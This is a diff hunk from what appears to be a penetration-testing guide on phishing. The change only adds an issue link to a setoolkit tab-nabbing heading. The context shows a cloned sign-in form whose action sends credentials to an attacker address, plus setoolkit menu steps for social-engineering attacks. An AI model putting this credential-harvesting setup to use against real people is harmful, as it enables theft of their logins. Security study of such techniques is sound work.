@@ -94,7 +94,7 @@ Note I changed the POST to a GET request for ease.
 <form class="form-signin" action="//10.10.14.148:8074" method="get">
 ```
 
-## Auto tab napping (setoolkit)
+## Auto tab napping (setoolkit) (currently having issue: https://github.com/trustedsec/social-engineer-toolkit/issues/727)
 
 1. Open setoolkit
 2. From main menu choose 1) Social engineering attacks
